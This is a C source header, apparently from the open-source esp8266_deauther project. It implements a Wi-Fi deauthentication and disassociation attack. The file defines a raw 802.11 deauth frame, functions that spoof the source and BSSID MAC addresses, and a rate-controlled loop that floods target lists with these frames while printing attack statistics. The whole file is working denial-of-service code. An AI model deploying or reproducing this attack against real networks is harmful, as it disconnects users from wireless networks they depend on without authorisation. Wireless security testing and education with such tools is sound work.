/*
   Copyright (c) 2020 Stefan Kremser (@Spacehuhn)
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#pragma once

// ========== DEAUTH PACKET ========== //
uint8_t deauth_pkt[] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // Reason code (1 = unspecified reason)
};

// ========== ATTACK DATA ========== //
typedef struct deauth_attack_data_t {
    TargetList    targets;
    bool          deauth;
    bool          disassoc;
    unsigned long rate;
    unsigned long timeout;
    unsigned long pkts;
    unsigned long start_time;
    unsigned long output_time;
    unsigned long pkts_sent;
    unsigned long pkts_per_second;
    unsigned long pkt_time;
    unsigned long pkt_interval;
    bool          silent;
} deauth_attack_data_t;

deauth_attack_data_t deauth_data;

// ========== SEND FUNCTIONS ========== //
bool send_deauth(uint8_t ch, const uint8_t* from, const uint8_t* to) {
    deauth_pkt[0] = 0xc0;
    memcpy(&deauth_pkt[10], from, 6);
    memcpy(&deauth_pkt[16], from, 6);
    memcpy(&deauth_pkt[4], to, 6);
    return send(ch, deauth_pkt, sizeof(deauth_pkt));
}

bool send_disassoc(uint8_t ch, const uint8_t* from, const uint8_t* to) {
    deauth_pkt[0] = 0xa0;
    memcpy(&deauth_pkt[10], from, 6);
    memcpy(&deauth_pkt[16], from, 6);
    memcpy(&deauth_pkt[4], to, 6);
    return send(ch, deauth_pkt, sizeof(deauth_pkt));
}

// ========== ATTACK FUNCTIONS ========== //
void startDeauth(TargetList& targets, bool deauth, bool disassoc, unsigned long rate, unsigned long timeout, unsigned long pkts, bool silent) {
    { // Error checks
        if (targets.size() == 0) {
            debuglnF("ERROR: No targets specified");
            return;
        }
        if (!deauth && !disassoc) {
            debuglnF("ERROR: Invalid mode");
            return;
        }
    }

    stopDeauth();

    { // Output
        debuglnF("[ ===== Deauth Attack ===== ]");

        debug(strh::left(16, "Mode:"));
        if (deauth && disassoc) {
            debuglnF("deauthentication and disassociation");
        } else if (deauth) {
            debuglnF("deauthentication");
        } else if (disassoc) {
            debuglnF("disassociation");
        }

        debug(strh::left(16, "Packets/second:"));
        debugln(rate);

        debug(strh::left(16, "Timeout:"));
        if (timeout > 0) debugln(strh::time(timeout));
        else debugln("-");

        debug(strh::left(16, "Max. packets:"));
        if (pkts > 0) debugln(pkts);
        else debugln("-");

        debug(strh::left(16, "Targets:"));
        debugln(targets.size());

        // Print MACs
        targets.begin();

        while (targets.available()) {
            Target* t = targets.iterate();
            debugF("- transmitter ");
            debug(strh::mac(t->getFrom()));
            debugF(", receiver ");
            debug(strh::mac(t->getTo()));
            debugF(", channel ");
            debugln(t->getCh());
        }

        debugln();
        debuglnF("Type 'stop' to stop the attack");
        debugln();
    }

    deauth_data.targets.moveFrom(targets);
    deauth_data.deauth          = deauth;
    deauth_data.disassoc        = disassoc;
    deauth_data.rate            = rate;
    deauth_data.timeout         = timeout;
    deauth_data.pkts            = pkts;
    deauth_data.start_time      = millis();
    deauth_data.output_time     = millis();
    deauth_data.pkts_sent       = 0;
    deauth_data.pkts_per_second = 0;
    deauth_data.pkt_time        = 0;
    deauth_data.pkt_interval    = (1000/rate) * (deauth+disassoc);
    deauth_data.silent          = silent;
}

void stopDeauth() {
    if (deauth_data.targets.size() > 0) {
        deauth_data.pkts_sent += deauth_data.pkts_per_second;
        deauth_data.targets.clear();

        debugF("Deauth attack stopped. Sent ");
        debug(deauth_data.pkts_sent);
        debuglnF(" packets.");
    }
}

void updateDeauth() {
    deauth_attack_data_t& d = deauth_data;

    if (d.targets.size() > 0) {
        if (((d.timeout > 0) && (millis() - d.start_time > d.timeout)) ||
            ((d.pkts > 0) && (d.pkts_sent >= d.pkts))) {
            stopDeauth();
            return;
        }

        if (!d.silent && (millis() - d.output_time >= 1000)) {
            d.pkts_sent += d.pkts_per_second;

            debugF("[Deauth attack: ");
            debug(d.pkts_per_second);
            debugF(" pkts/s, ");
            debug(d.pkts_sent);
            debuglnF(" total]");

            d.output_time = millis();

            d.pkts_per_second = 0;
        }

        if (millis() - d.pkt_time >= d.pkt_interval) {
            Target* t = d.targets.iterate();

            if (d.deauth) d.pkts_per_second += send_deauth(t->getCh(), t->getFrom(), t->getTo());
            if (d.disassoc) d.pkts_per_second += send_disassoc(t->getCh(), t->getFrom(), t->getTo());

            d.pkt_time = millis();
        }

        if (!d.targets.available()) d.targets.begin();
    }
}